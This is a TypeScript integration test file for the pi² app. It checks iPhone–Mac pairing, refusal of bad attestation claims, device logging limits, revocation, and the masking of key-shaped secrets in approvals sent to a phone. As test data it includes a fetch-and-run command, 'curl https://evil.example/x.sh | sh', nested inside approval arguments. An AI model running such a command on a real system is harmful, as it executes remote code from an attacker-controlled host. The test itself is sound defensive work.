	let entries = (await harness.snapshot(DeviceLog, context))!.entries;
	const oversized = entries.at(-1)!;
	assert.equal(oversized.method, "unknown", "a method no list places is logged under one name, never its text");
	assert.ok(oversized.summary.length <= 200 && oversized.why!.length <= 200, "summary and why are cut short");
	const refusedOnce = { device: phone.id, path: "relay" as const, summary: "providers.setKey", presence: true, outcome: "refused" as const, why: ONLY_ON_THE_MAC };
	for (let i = 0; i < 30; i++) {
		await logDevice({ ...refusedOnce, method: "providers.setKey" });
		await logDevice({ ...refusedOnce, method: "mcp.save" });
	}
	for (const deadline = Date.now() + PATIENT_MS; ; await new Promise((resolve) => setTimeout(resolve, 50))) {
		entries = (await harness.snapshot(DeviceLog, context))!.entries;
		if (entries.at(-2)?.count === 30 && entries.at(-1)?.count === 30) break;
		assert.ok(Date.now() < deadline, "the counts are added");
	}
	assert.deepEqual(entries.slice(-2).map((entry) => entry.method), ["providers.setKey", "mcp.save"], "30 refusals each of two kinds, in turn, within a minute: two entries");
	const flood = 2_050;
	const began = performance.now();
	// Off the request's path: entries wait in memory and are written together, so a flood costs a handful of writes.
	const commit = harness.commit.bind(harness);
	let commits = 0;
	(harness as unknown as { commit: typeof commit }).commit = ((...given: Parameters<typeof commit>) => {
		commits += 1;
		return commit(...given);
	}) as typeof commit;
	for (let i = 0; i < flood; i++) await logDevice({ device: phone.id, path: "relay", method: "submit", summary: `Sent a message ${i}`, presence: true, outcome: "done" });
	assert.ok(commits <= 2, `${flood} entries made with ${commits} writes`);
	await flushDeviceLog();
	console.log(`    ${flood} entries from one device in ${Math.round(performance.now() - began)} ms, ${commits} writes`);
	entries = (await harness.snapshot(DeviceLog, context))!.entries;
	assert.ok(entries.some((entry) => entry.device === other), "another device's entry stays");
	assert.ok(entries.some((entry) => entry.device === phone.id && entry.method === "pair"), "and the pairing");
	assert.equal(entries.filter((entry) => entry.device === phone.id && entry.method !== "pair").length, 2_000, "one device keeps its own newest 2,000");
	const stored = async () => (await harness.snapshot(DeviceLog, context))!.entries;
	commits = 0;
	for (let i = 0; i < 200; i++) await logDevice({ device: other, path: "relay", method: "submit", summary: `ordinary ${i}`, presence: true, outcome: "done" });
	assert.ok(commits <= 1, `200 ordinary requests wait in memory: ${commits} writes`);
	await logDevice({ device: other, path: "relay", method: "usage.setBudget", summary: "widening", presence: true, outcome: "done" }, true);
	assert.ok(commits <= 2, `and are written with the next urgent one: ${commits} writes in all`);
	assert.ok((await stored()).some((entry) => entry.summary === "widening") && (await stored()).filter((entry) => entry.summary.startsWith("ordinary ")).length === 200, "a widening request is on disk when logDevice resolves, the waiting ones with it");
	await logDevice({ device: other, path: "relay", method: "submit", summary: "at the stop", presence: true, outcome: "done" });
	assert.ok(!(await stored()).some((entry) => entry.summary === "at the stop"));
	await flushDeviceLog();
	assert.ok((await stored()).some((entry) => entry.summary === "at the stop"), "what waits is written at a clean stop (main.ts calls flushDeviceLog)");
	await harness.close(context);
	step(`the devices' log: a method it does not know is "unknown", every field cut short, refusals made one entry with a count, one device's flood of ${flood} pushes out neither another's entries nor its own pairing, and entries wait in memory but for urgent ones and a stop`);
}

// ---- A pairing whose device cannot be saved: the phone is told, not left waiting (3.3 step 8)

{
	process.env.PI2_APP_ATTEST_STAND_IN = "1";
	process.env.PI2_APP_ATTEST_TEAM = "ABCDE12345";
	const harness = await Harness.open(await openNodeSqliteStorage(join(mkdtempSync(join(work, "save-")), "session.sqlite")), { registry: createRegistry(), models: createModels() }, context);
	const pairing = b64url(randomBytes(16));
	await harness.commit(async (tx) => {
		const doc = await tx.doc(Devices);
		Object.assign(doc, { pairing, relay: "ws://127.0.0.1:9/v1", macKeys: { identity: spki(p256().publicKey), channel: b64url(randomBytes(32)), record: spki(p256().publicKey), relay: spki(p256().publicKey), secureEnclave: false } });
		doc.remote = { ...doc.remote, preview: true, on: true };
	}, context);
	await wireDevices({ harness, context, log: () => {}, release: false, names: { conversation: () => undefined, project: () => undefined } });
	const told: any[] = [];
	Object.assign(remoteHooks, { toHelper: (event: unknown) => told.push(event), ready: async () => ({ addresses: [] }), addresses: () => [], changed: () => {} });
	const client = { socket: { write: () => true, destroyed: false, destroy: () => {} }, subscriptions: new Map(), shown: new Set() } as unknown as Client;
	const { payload } = (await deviceRequests["devices.pairStart"]!({}, client)) as { payload: string };
	const secret = Buffer.from(new URL(payload).searchParams.get("s")!, "base64url");
	const binding = randomBytes(32);
	const challenge = randomBytes(32);
	const { claim } = await pairClaim({ claim: new Phone("Unsaved iPhone").claim(pairing, binding, challenge), binding: b64url(binding), challenge: b64url(challenge), path: "relay" });
	const digits = String(createHmac("sha256", secret).update(Buffer.concat([Buffer.from("pi2-digits"), Buffer.from([0]), binding])).digest().readUInt32BE(0) % 1_000_000).padStart(6, "0");
	const commit = harness.commit.bind(harness);
	(harness as unknown as { commit: () => Promise<never> }).commit = async () => {
		throw new Error("The disk is full.");
	};
	await assert.rejects(deviceRequests["devices.pairConfirm"]!({ digits }, client), /The disk is full/);
	(harness as unknown as { commit: typeof commit }).commit = commit;
	assert.deepEqual(told.filter((event) => event.kind === "pairRefused" || event.kind === "paired"), [{ kind: "pairRefused", claim, why: "The Mac could not save the pairing. Start again." }], "the phone is refused, and told nothing else");
	assert.equal(devicesState().devices.length, 0, "and nothing was paired");
	await harness.close(context);
	step("a pairing whose device cannot be saved is refused to the phone, not left without an answer");
}

// ---- A log line never throws, whatever a device sends (#895): it runs before the request's own `try`

{
	assert.equal(summarize("pushes.set", { project: null }), "Notifications: unquieted a project", "a project of null");
	assert.equal(summarize("pushes.set", { project: "x", needs: true }), "Notifications: needs on, unquieted a project", "a project that is a string");
	const cannotBeWords = { toString: 1, valueOf: 1 };
	assert.throws(() => String(cannotBeWords), TypeError, "String of what a device can send can throw");
	assert.equal(summarize("conversation.rename", { title: cannotBeWords }), "Renamed a conversation to “?”");
	assert.equal(summarize("github.merge", { number: cannotBeWords }), "Merged #?");
	assert.equal(summarize("work.act", { action: cannotBeWords, id: cannotBeWords }), "? work #?");
	// And a line that throws all the same is the method's name alone.
	const throwing = Object.defineProperty({}, "needs", {
		enumerable: true,
		get() {
			throw new Error("A getter's fault.");
		},
	});
	assert.equal(summarize("pushes.set", throwing), "pushes.set");
	step("a log line is made of whatever a device sends (null, an object for a string) and never throws: at worst it is the method's name");
}

// ---- A revocation reaches pi² Remote and the device's sessions whatever its watchers do (#895)

{
	const harness = await Harness.open(await openNodeSqliteStorage(join(mkdtempSync(join(work, "revoke-")), "session.sqlite")), { registry: createRegistry(), models: createModels() }, context);
	const phone = new Phone();
	phone.id = `dev_${b64url(randomBytes(16))}`;
	await harness.commit(async (tx) => {
		const doc = await tx.doc(Devices);
		doc.pairing = b64url(randomBytes(16));
		doc.remote = { ...doc.remote, preview: true, on: true };
		doc.devices.push({ id: phone.id, ...phone.description(), pendingPresenceKey: null, attestKeyId: phone.keyId, suspendedAt: null, pairedAt: Date.now(), lastSeenAt: null, lastPath: null, revokedAt: null });
	}, context);
	const logged: string[] = [];
	await wireDevices({ harness, context, log: (...parts) => logged.push(parts.join(" ")), release: false, names: { conversation: () => undefined, project: () => undefined } });
	const told: any[] = [];
	const closed: string[] = [];
	Object.assign(remoteHooks, { toHelper: (event: unknown) => told.push(event), closeSessions: (device: string) => closed.push(device), recordChanged: () => {}, changed: () => {} });
	const after: string[] = [];
	const failing = () => {
		throw new Error("A watcher's fault.");
	};
	const later = (device: string) => void after.push(device);
	revokedWatchers.add(failing);
	revokedWatchers.add(later);
	const client = { socket: { write: () => true, destroyed: false, destroy: () => {} }, subscriptions: new Map(), shown: new Set() } as unknown as Client;
	try {
		assert.deepEqual(await deviceRequests["devices.revoke"]!({ device: phone.id }, client), {});
	} finally {
		revokedWatchers.delete(failing);
		revokedWatchers.delete(later);
	}
	assert.deepEqual(told.filter((event) => event.kind === "revoke"), [{ kind: "revoke", device: phone.id }], "pi² Remote is told");
	assert.deepEqual(closed, [phone.id], "the device's sessions are closed");
	assert.deepEqual(after, [phone.id], "the next watcher is told too");
	assert.ok(logged.some((line) => line.includes("A watcher's fault.")), `the fault is logged: ${logged.join(" | ")}`);
	assert.notEqual(devicesState().devices.find((one) => one.id === phone.id)!.revokedAt, null, "and the device is revoked");
	await harness.close(context);
	step("a watcher of revocations that throws is logged, and the next watcher, pi² Remote and the device's sessions are still told");
}

// ---- A real engine, and this test as its pi² Remote

const home = mkdtempSync(join(work, "home-"));
const helperPath = join(work, "helper.sock");
const standIn = join(work, "stand-in.mjs");
writeFileSync(
	standIn,
	`import { connect, Socket } from "node:net";
const engine = new Socket({ fd: 3, readable: true, writable: true });
const test = connect(${JSON.stringify(helperPath)});
test.write(JSON.stringify({ standIn: { pid: process.pid, ppid: process.ppid } }) + "\\n");
engine.pipe(test);
test.pipe(engine);
const end = () => process.exit(0);
for (const side of [engine, test]) side.on("close", end).on("error", end);
`,
);

/** One connection from the stand-in: this test as pi² Remote. */
class Remote {
	readonly lines: string[] = [];
	readonly events: any[] = [];
	readonly sessionLines = new Map<string, any[]>();
	standIn: { pid: number; ppid: number } | null = null;
	pairing = b64url(randomBytes(16));
	macKeys = { identity: spki(p256().publicKey), channel: b64url(randomBytes(32)), record: spki(p256().publicKey), relay: spki(p256().publicKey), secureEnclave: false };
	closed = false;
	#next = 1;
	#replies = new Map<number, (reply: any) => void>();

	readonly socket: Socket;

	constructor(socket: Socket) {
		this.socket = socket;
		let buffer = "";
		socket.setEncoding("utf8").on("data", (chunk: string) => {
			buffer += chunk;
			const lines = buffer.split("\n");
			buffer = lines.pop()!;
			for (const line of lines) this.#heard(line);
		});
		socket
			.on("close", () => {
				this.closed = true;
				// No answer is coming to a request still waiting for one.
				for (const resolve of this.#replies.values()) resolve({ error: "pi² Remote's connection closed" });
				this.#replies.clear();
			})
			.on("error", () => {});
	}

	#heard(line: string): void {
		const message = JSON.parse(line);
		if (message.standIn !== undefined) {
			this.standIn = message.standIn;
			return;
		}
		this.lines.push(line);
		if (message.event === "remote") {
			this.events.push(message);
			// As pi² Remote does: say hello at the start, and register with the relay when asked.
			if (message.kind === "start") void this.call("remote.hello", { macKeys: this.macKeys, pairing: message.pairing, addresses: ["127.0.0.1:4242"] });
			if (message.kind === "register") void this.call("remote.state", { pairing: this.pairing });
		} else if (typeof message.session === "string") {
			this.sessionLines.set(message.session, [...(this.sessionLines.get(message.session) ?? []), message.message]);
		} else {
			this.#replies.get(message.id)?.(message);
			this.#replies.delete(message.id);
		}
	}

	call(method: string, params: Record<string, unknown> = {}): Promise<any> {
		if (this.closed) return Promise.resolve({ error: "pi² Remote's connection closed" });
		const id = this.#next++;
		const reply = new Promise<any>((resolve) => this.#replies.set(id, resolve));
		this.socket.write(`${JSON.stringify({ id, method, params })}\n`);
		return reply;
	}

	/** A device's request in a session, and its answer. */
	async inSession(session: string, method: string, params: Record<string, unknown> = {}): Promise<any> {
		const id = `${this.#next++}`;
		this.socket.write(`${JSON.stringify({ session, message: { id, method, params } })}\n`);
		return until(`the answer to ${method} in session ${session}`, () => this.sessionLines.get(session)?.find((message) => message.id === id), { over: () => (this.closed ? "pi² Remote's connection closed" : undefined) });
	}

	event(kind: string, after = 0): Promise<any> {
		return until(`a remote event ${kind}`, () => this.events.slice(after).find((event) => event.kind === kind), { over: () => (this.closed ? "pi² Remote's connection closed" : undefined) });
	}
}

const remotes: Remote[] = [];
const server = createServer((socket) => remotes.push(new Remote(socket)));
await new Promise<void>((resolve) => server.listen(helperPath, resolve));
const nextRemote = (count: number) => until(`pi² Remote number ${count}`, () => remotes.length >= count && remotes[count - 1]!.standIn !== null && remotes[count - 1]!);

class App extends EngineClient {
	readonly devicesEvents: any[] = [];
	override receive(message: any): void {
		super.receive(message);
		if (message.event === "devices") this.devicesEvents.push(message);
	}
	notice(kind: string, after = 0): Promise<any> {
		return this.until(`a notice of ${kind}`, () => this.devicesEvents.slice(after).find((event) => event.notice?.kind === kind)?.notice);
	}
}

const env = {
	...process.env,
	PI2_HOME: home,
	PI2_KEYCHAIN_SERVICE: KEYCHAIN_SERVICE,
	PI2_APP_BUNDLE: standInApp(),
	PI2_REMOTE_STAND_IN: standIn,
	PI2_APP_ATTEST_STAND_IN: "1",
	PI2_APP_ATTEST_TEAM: "ABCDE12345",
	// Its log line and its handling from a device's line throw (#895): the engine must answer and carry on.
	PI2_DEVICE_FAULT: "conversation.pin",
};
const main = join(import.meta.dirname, "..", "src", "main.ts");

// ---- A handler placed in no list stops the engine before it listens

{
	const unplacedHome = mkdtempSync(join(work, "unplaced-"));
	let errors = "";
	const engine = spawn(process.execPath, [main], { env: { ...env, PI2_HOME: unplacedHome, PI2_UNPLACED_HANDLER: "made.up" }, stdio: ["ignore", "ignore", "pipe"] });
	engines.push(engine);
	engine.stderr!.setEncoding("utf8").on("data", (text: string) => (errors += text));
	const code = await new Promise<number | null>((resolve) => engine.once("exit", resolve));
	assert.notEqual(code, 0, "the engine did not start");
	const logged = existsSync(join(unplacedHome, "engine.log")) ? readFileSync(join(unplacedHome, "engine.log"), "utf8") : "";
	assert.match(errors + logged, /fatal: uncaught exception Error: Device lists in answers\.ts:\n\S* ?made\.up belongs to 0 device lists \(expected one\)/);
	assert.ok(!existsSync(join(unplacedHome, "engine.sock")), "and never listened");
	step("a handler placed in no device list stops the engine before it opens its socket");
}

// Its log, kept to check what it never holds, and shown as it comes.
let engineLog = "";
const engine = spawn(process.execPath, [main], { env, stdio: ["ignore", "ignore", "pipe"] });
engines.push(engine);
engine.stderr!.setEncoding("utf8").on("data", (text: string) => {
	engineLog += text;
	process.stderr.write(text);
});
const app = await App.connect(engine, home);
const childrenOf = (pid: number) => {
	try {
		return execFileSync("/usr/bin/pgrep", ["-P", String(pid)], { encoding: "utf8" }).trim().split("\n").filter(Boolean).map((child) => execFileSync("/bin/ps", ["-o", "command=", "-p", child], { encoding: "utf8" }).trim());
	} catch {
		return [];
	}
};
try {
	// ---- The preview off: nothing pairs, attaches or starts, and remote.* is refused on the socket
	assert.deepEqual((await app.call("devices.watch")).remote, { on: false, relay: true, home: true, direct: false, preview: false });
	await assert.rejects(app.call("devices.pairStart"), /Turn on Reach from an iPhone first/);
	await app.call("devices.set", { on: true });
	await assert.rejects(app.call("devices.pairStart"), /Turn on Reach from an iPhone first/, "remote access on, the preview off");
	for (const method of ["remote.attach", "remote.attachBegin", "remote.pairClaim", "remote.pairRefused", "remote.hello", "remote.sessionEnd", "remote.pushRefused"]) {
		await assert.rejects(app.call(method, {}), (error: Error) => error.message === ONLY_FROM_THE_HELPER, `${method} on the socket, from a process PeerKit takes for the app`);
	}
	assert.ok(!childrenOf(engine.pid!).some((command) => command.includes(standIn)), "no pi² Remote, and no socket pair, was made");
	assert.equal(remotes.length, 0);
	// The relay's address in its one written form: pi² Remote keeps a relay key for each exact address.
	for (const spelling of ["wss://RELAY.example/v1", "wss://relay.example:443/v1", " wss://relay.example/v1", "wss://relay.example/./v1", "WSS://relay.example/v1", "wss://relay.example/v1\t"]) {
		assert.equal((await app.call("devices.set", { relayAddress: spelling })).relay, "wss://relay.example/v1", JSON.stringify(spelling));
	}
	for (const refused of ["wss://user:secret@relay.example/v1", "wss://user@relay.example/v1", "wss://relay.example./v1", "https://relay.example/v1", "ws://relay.example/v1", "wss://relay.example/v1?k=1", "not an address"]) {
		await assert.rejects(app.call("devices.set", { relayAddress: refused }), /The relay's address is wss:\/\/host\/path/, refused);
	}
	assert.equal(app.devicesEvents.at(-1).relay, "wss://relay.example/v1", "nothing refused was stored");
	await app.call("devices.set", { preview: true, relayAddress: "ws://127.0.0.1:9/v1" });
	assert.ok(!childrenOf(engine.pid!).some((command) => command.includes(standIn)), "nor with nothing paired and no pairing open");
	step("with the preview off no device can pair and no socket pair is made; remote.* is refused on the engine's socket");

	// ---- Pairing (3.1, 3.3)
	const opened = app.call("devices.pairStart");
	const remote = await nextRemote(1);
	assert.equal(remote.standIn!.ppid, engine.pid, "pi² Remote is the engine's own child, on the socket pair it made");
	const start = await remote.event("start");
	assert.deepEqual(start.devices, []);
	await remote.event("register");
	const { payload, expires } = await opened;
	const join_ = await remote.event("openJoin");
	const fields = new URL(payload).searchParams;
	assert.equal(payload.split("?")[1]!.split("&").map((pair: string) => pair.split("=")[0]).join(","), "v,p,n,c,i,r,s,u,a,e");
	const secret = Buffer.from(fields.get("s")!, "base64url");
	assert.equal(fields.get("s"), join_.secret, "pi² Remote is given s");
	assert.equal(fields.get("p"), remote.pairing);
	assert.equal(fields.get("c"), remote.macKeys.channel);
	assert.equal(fields.get("i"), remote.macKeys.identity);
	assert.equal(fields.get("u"), "ws://127.0.0.1:9/v1");
	assert.equal(fields.get("a"), "127.0.0.1:4242");
	assert.equal(Number(fields.get("e")), Math.floor(expires / 1000));
	const mac = (label: string, bound: Buffer) => createHmac("sha256", secret).update(Buffer.concat([Buffer.from(label), Buffer.from([0]), bound])).digest();
	assert.equal(join_.tokenHash, createHash("sha256").update(mac("pi2-join", Buffer.from(remote.pairing))).digest("base64url"), "the relay is given the token's hash");
	const digitsOf = (binding: Buffer) => String(mac("pi2-digits", binding).readUInt32BE(0) % 1_000_000).padStart(6, "0");

	const phone = new Phone();
	const binding = randomBytes(32);
	const macChallenge = randomBytes(32);
	const { claim } = (await remote.call("remote.pairClaim", { claim: phone.claim(remote.pairing, binding, macChallenge), binding: b64url(binding), challenge: b64url(macChallenge), path: "relay" })).result;
	assert.ok(claim);
	const notice = await app.notice("claim");
	assert.match(notice.text, /Alex's iPhone wants to pair/);
	const shown = app.devicesEvents.at(-1).pairingWindow.claim;
	assert.deepEqual(Object.keys(shown).sort(), ["at", "model", "name", "path", "replaces", "system", "wrongDigits"], "the claim is shown, its digits are not");
	const digits = digitsOf(binding);
	const wrong = digits === "000000" ? "000001" : "000000";
	await assert.rejects(app.call("devices.pairConfirm", { digits: wrong }), /not the digits the phone shows/);
	const beforePaired = remote.events.length;
	({ device: phone.id } = await app.call("devices.pairConfirm", { digits }));
	const paired = await remote.event("paired", beforePaired);
	assert.equal(paired.claim, claim);
	assert.deepEqual(paired.paired, { device: phone.id, pairing: remote.pairing, name: paired.paired.name, addresses: ["127.0.0.1:4242"] });
	assert.equal(paired.device.deviceKey, spki(phone.device.publicKey));
	await app.notice("paired");
	const listed = app.devicesEvents.at(-1).devices.find((one: any) => one.id === phone.id);
	assert.equal(listed.name, "Alex's iPhone");
	assert.equal(listed.attestKeyId, phone.keyId);
	assert.ok(!app.devicesEvents.some((event) => JSON.stringify(event).includes(join_.secret)), "s is in no devices event");
	step("pairing: the code's payload to the app, s to pi² Remote alone, the claim checked and shown without its digits, paired once the digits are typed");

	// ---- One claim per window, and every other refusal closes it (3.3)
	const claimIn = async (claimer: Phone, attest: Record<string, unknown> = {}, edit: (line: any) => void = () => {}, via = remote) => {
		const opening = app.call("devices.pairStart");
		const opened = await via.event("openJoin", via.events.length);
		await opening;
		const channel = randomBytes(32);
		const challenge = randomBytes(32);
		const line = claimer.claim(remote.pairing, channel, challenge, attest);
		edit(line);
		const digits = String(createHmac("sha256", Buffer.from(opened.secret, "base64url")).update(Buffer.concat([Buffer.from("pi2-digits"), Buffer.from([0]), channel])).digest().readUInt32BE(0) % 1_000_000).padStart(6, "0");
		return { channel, digits, reply: await via.call("remote.pairClaim", { claim: line, binding: b64url(channel), challenge: b64url(challenge), path: "home" }) };
	};
	const first = await claimIn(new Phone("Sam's iPhone"));
	assert.ok(first.reply.result.claim);
	const refusedBefore = remote.events.length;
	const second = await remote.call("remote.pairClaim", { claim: new Phone("Stranger").claim(remote.pairing, randomBytes(32), randomBytes(32)), binding: b64url(randomBytes(32)), challenge: b64url(randomBytes(32)), path: "relay" });
	assert.equal(second.error, SECOND_CLAIM, "a second claim is refused");
	assert.equal((await remote.event("pairRefused", refusedBefore)).claim, first.reply.result.claim, "and so is the first");
	await app.until("the window closed for the second claim", () => app.devicesEvents.at(-1)?.closed?.why === SECOND_CLAIM && app.devicesEvents.at(-1).pairingWindow === null);
	await assert.rejects(app.call("devices.pairConfirm", { digits: digitsOf(first.channel) }), /No phone is waiting/);
	const refusals: [string, Record<string, unknown>, (line: any) => void, RegExp][] = [
		["an attestation for other client data", { clientDataHash: b64url(randomBytes(32)) }, () => {}, /App Attest: The attestation was made for other client data/],
		["one for another app", { appId: "ZZZZZ99999.dev.pi2.ios" }, () => {}, /made for another app/],
		["one not of the stand-in's", {}, (line) => (line.attestation = b64url(randomBytes(64))), /App Attest/],
		["no attestation", {}, (line) => ((line.attestation = null), (line.keyId = null)), /no App Attest attestation/],
		["a launch validation category of 2", { validationCategory: 2 }, () => {}, /not launched as/],
		["none", { validationCategory: null }, () => {}, /not launched as/],
		["a bundle version that is not its build", { bundleVersion: "6" }, () => {}, /build is not the one the claim names/],
		["an App Attest key tied to a pairing already", { keyId: phone.keyId }, (line) => (line.keyId = phone.keyId), /tied to another pairing/],
		["a signature by another key", {}, (line) => (line.signature = signText(line.signed, p256().privateKey)), /not signed by the device key/],
		["a claim for another pairing", {}, (line) => (line.signed = JSON.stringify({ v: 2, kind: "pair", pairing: b64url(randomBytes(16)), binding: "x" })), /another pairing|another channel|not signed/],
		["a field it does not know", {}, (line) => (line.extra = true), /not a pair line/],
	];
	for (const [what, attest, edit, expected] of refusals) {
		const { reply } = await claimIn(new Phone("Pat's iPhone"), attest, edit);
		assert.match(reply.error ?? "", expected, what);
		await app.until(`the window closed after ${what}`, () => app.devicesEvents.at(-1)?.pairingWindow === null && app.devicesEvents.at(-1)?.closed?.why.startsWith("A phone's claim was refused"));
	}
	// A claimer pi² Remote refused itself, having proved the secret: the window closes as for any refused claim.
	const reopened = app.call("devices.pairStart");
	await remote.event("openJoin", remote.events.length);
	await reopened;
	assert.match((await remote.call("remote.pairRefused", { why: "anything" })).error, /why is one of not-pair, not-bound, silent/);
	assert.deepEqual((await remote.call("remote.pairRefused", { why: "silent" })).result, {});
	await app.until("the window closed for a claimer pi² Remote refused", () => app.devicesEvents.at(-1)?.pairingWindow === null && app.devicesEvents.at(-1)?.closed?.why === "A phone's claim was refused: it went quiet.");
	assert.match((await remote.call("remote.pairRefused", { why: "not-pair" })).error, /No pairing is open/);
	const third = await claimIn(new Phone("Kim's iPhone"));
	assert.ok(third.reply.result.claim);
	for (let i = 0; i < 3; i++) await assert.rejects(app.call("devices.pairConfirm", { digits: wrong }));
	await app.until("the window closed after three wrong entries", () => app.devicesEvents.at(-1)?.closed?.why === "Three wrong entries. Start again.");
	await assert.rejects(app.call("devices.pairConfirm", { digits: digitsOf(third.channel) }), /No phone is waiting/);
	assert.deepEqual(app.devicesEvents.at(-1).devices.filter((one: any) => one.revokedAt === null).map((one: any) => one.id), [phone.id], "nothing else was paired");
	step(`one claim per window: a second closes it and refuses both; so do ${refusals.length} claims that fail a check, a claimer pi² Remote refused itself, and three wrong digits`);

	// ---- Attaching, and the device's table in a session (3.4, 4.1)
	const attach = async (options: { session?: string | null; binding?: Buffer; at?: number; challenge?: string; device?: KeyObject; presence?: KeyObject | null } = {}) => {
		const challenge = options.challenge ?? (await remote.call("remote.attachBegin")).result.challenge;
		const channel = options.binding ?? randomBytes(32);
		const line = phone.attach({ pairing: remote.pairing, challenge, binding: channel, session: options.session ?? null, ...(options.at === undefined ? {} : { at: options.at }) }, options);
		return { challenge, reply: await remote.call("remote.attach", { attach: line, binding: b64url(channel), path: "relay" }) };
	};
	const first_ = await attach();
	const session = first_.reply.result.session as string;
	assert.equal(first_.reply.result.resume, false);
	const greeting = await until("the greeting and the device event", () => {
		const lines = remote.sessionLines.get(session) ?? [];
		return lines.some((line) => line.event === "device") && lines;
	});
	const sent = greeting.map((line: any) => line.event);
	for (const event of ["library", "agents", "inbox", "activity", "schedules", "recovery", "usage", "chat"]) assert.ok(sent.includes(event), `the greeting sends ${event}`);
	for (const event of ["mcp", "devices", "computer", "browser", "auth", "local"]) assert.ok(!sent.includes(event), `and never ${event}`);
	const deviceEvent = greeting.find((line: any) => line.event === "device");
	assert.deepEqual(deviceEvent, { event: "device", id: phone.id, name: "Alex's iPhone", pairing: remote.pairing, mac: deviceEvent.mac, addresses: ["127.0.0.1:4242"], relay: true, revoked: false });
	await app.until("the session shown on the Mac", () => app.devicesEvents.at(-1)?.sessions.some((one: any) => one.session === session && one.device === phone.id));

	const ask = (method: string, params: Record<string, unknown> = {}) => remote.inSession(session, method, params);
	const info = (await ask("engine.info")).result;
	assert.deepEqual(info, { build: null, pid: engine.pid }, "no path of the Mac's");
	assert.ok(!("main" in info) && !("backup" in info), "neither the engine's file nor the last unfinished backup's folder");
	const appInfo = await app.call("engine.info");
	assert.ok("main" in appInfo && "backup" in appInfo, "the app is told both");
	assert.deepEqual((await ask("connection.mayAnswer")).result, { mayAnswer: false, why: "this is a paired device's session, which is never the app" });
	for (const [method, params] of [
		["agents.allowEverything", { id: "forge", on: true }],
		["providers.setKey", { id: "openai", key: "sk-x" }],
		["variables.set", { agentId: "forge", name: "X", value: "y" }],
		["devices.pairStart", {}],
		["devices.revoke", { device: phone.id }],
		["remote.attach", {}],
		["chat.continueWithAgent", { id: 1, agentId: "forge", cwd: work }],
	] as const) {
		assert.equal((await ask(method, params)).error, ONLY_ON_THE_MAC, method);
	}
	assert.deepEqual((await ask("agents.allowEverything", { id: "forge", on: false })).result, {}, "turning it off is the device's too");
	const widened = app.devicesEvents.length;
	assert.ok((await ask("usage.setBudget", { daily: 25 })).result !== undefined);
	assert.match((await app.notice("widening", widened)).text, /^Alex's iPhone: usage\.setBudget/, "the Mac is told of a request that widens");
	// An approval judged by its project's switch, through the engine's own lookup of the waiting approval: once on what
	// makeAgents holds back widens; once on an ordinary approval does not. (The merge switch is judged by the same
	// lookup; reaching it would need a pull request on GitHub's stand-in.)
	const made = await app.call("projects.create", { folder: null });
	await app.call("projects.set", { id: made.id, settings: { withoutAsking: { makeAgents: false } } });
	await app.call("conversation.open", { id: made.conversation });
	void app.call("submit", { id: made.conversation, text: `/tool project_agents ${JSON.stringify({ action: "make", settings: { name: "Temp", access: "read" } })}` });
	const switched = await app.until("the makeAgents switch's approval", () => app.events.inbox?.items?.find((item: any) => item.projectSwitch === "makeAgents"));
	const beforeSwitch = app.devicesEvents.length;
	assert.deepEqual((await ask("inbox.decide", { id: switched.id, decision: "once" })).result, {});
	assert.match((await app.notice("widening", beforeSwitch)).text, /^Alex's iPhone: Answered an approval: once/, "once past makeAgents widens");
	const { id: plain } = await app.call("conversation.create", { agentId: "forge" });
	await app.call("conversation.open", { id: plain });
	await app.call("conversation.configure", { id: plain, access: "ask", cwd: work });
	void app.call("submit", { id: plain, text: "/bash echo plain" });
	const ordinary = await app.until("an ordinary approval", () => app.events.inbox?.items?.find((item: any) => item.conversationId === plain && item.kind === "approval"));
	assert.equal(ordinary.projectSwitch, undefined);
	const beforeOrdinary = app.devicesEvents.length;
	assert.deepEqual((await ask("inbox.decide", { id: ordinary.id, decision: "once" })).result, {});
	await app.call("engine.info");
	assert.ok(!app.devicesEvents.slice(beforeOrdinary).some((event) => event.notice?.kind === "widening"), "once on an ordinary approval does not");
	// A call holding a key shape is shown to the phone in part, marked so: the phone may deny it, not allow it.
	const keyed = "sk-ant-api03-aKeyShapedStringInACommand0123456789";
	const askApproval = async (text: string, after: string[]) => {
		void app.call("submit", { id: plain, text });
		return app.until(`the approval of ${text}`, () => app.events.inbox?.items?.find((item: any) => item.conversationId === plain && item.kind === "approval" && !after.includes(item.id)));
	};
	const masked = await askApproval(`/bash echo ${keyed} | base64 -d`, [ordinary.id]);
	const shownToPhone = await until("the phone's copy of it", () =>
		remote.sessionLines.get(session)?.findLast((line) => line.event === "inbox" && line.items.some((item: any) => item.id === masked.id))?.items.find((item: any) => item.id === masked.id),
	);
	assert.equal(shownToPhone[PART_HIDDEN], true, "marked as shown in part");
	assert.ok(!JSON.stringify(shownToPhone).includes(keyed));
	// Its alert, as pushes.ts chose it for pi² Remote to seal (#689): the same mask, the same mark, never whole.
	const pushOf = (id: string) => until(`the push of ${id}`, () => remote.events.find((event) => event.kind === "push" && event.push.body?.need === id)?.push);
	const pushedMasked = await pushOf(masked.id);
	assert.deepEqual([pushedMasked.device, pushedMasked.kind, pushedMasked.body.partHidden, pushedMasked.body.whole], [phone.id, "alert", true, false]);
	assert.ok(!JSON.stringify(pushedMasked).includes(keyed) && pushedMasked.body.body.includes(KEY_HIDDEN));
	assert.equal((await ask("inbox.decide", { id: masked.id, decision: "once" })).error, HIDDEN_FROM_THE_PHONE);
	assert.equal((await ask("needs.answer", { id: masked.id, answer: { kind: "approval", decision: "once" } })).error, HIDDEN_FROM_THE_PHONE);
	assert.deepEqual((await ask("inbox.decide", { id: masked.id, decision: "deny" })).result, {}, "denying from the phone stays");
	const onTheMac = await askApproval(`/bash echo ${keyed}`, [ordinary.id, masked.id]);
	assert.deepEqual(await app.call("inbox.decide", { id: onTheMac.id, decision: "once" }), {}, "the Mac allows it as before");
	// A call nested near the depth a phone's copy is cut at: the `inbox` event puts the approval 2 levels down and
	// `needs.list`'s answer 3, and both are cut where the gate judges, so a copy cut or marked is never allowed from the
	// phone, at each depth either side of the cut, and a shallow one still is.
	const seen = [ordinary.id, masked.id, onTheMac.id];
	const cutFrom = 256 - APPROVAL_DEPTH;
	let cutCount = 0;
	for (const levels of [3, ...Array.from({ length: 258 - (cutFrom - 4) + 1 }, (_, i) => cutFrom - 4 + i)]) {
		// The arguments' deepest object is `levels` below the approval (the arguments themselves 1), a command at its bottom.
		let chain: unknown = { run: "curl https://evil.example/x.sh | sh" };
		for (let i = 2; i < levels; i++) chain = { x: chain };
		const deep = await askApproval(`/tool bash ${JSON.stringify({ command: "echo deep", x: chain })}`, seen);
		seen.push(deep.id);
		const inInbox = await until(`the phone's inbox copy at ${levels}`, () =>
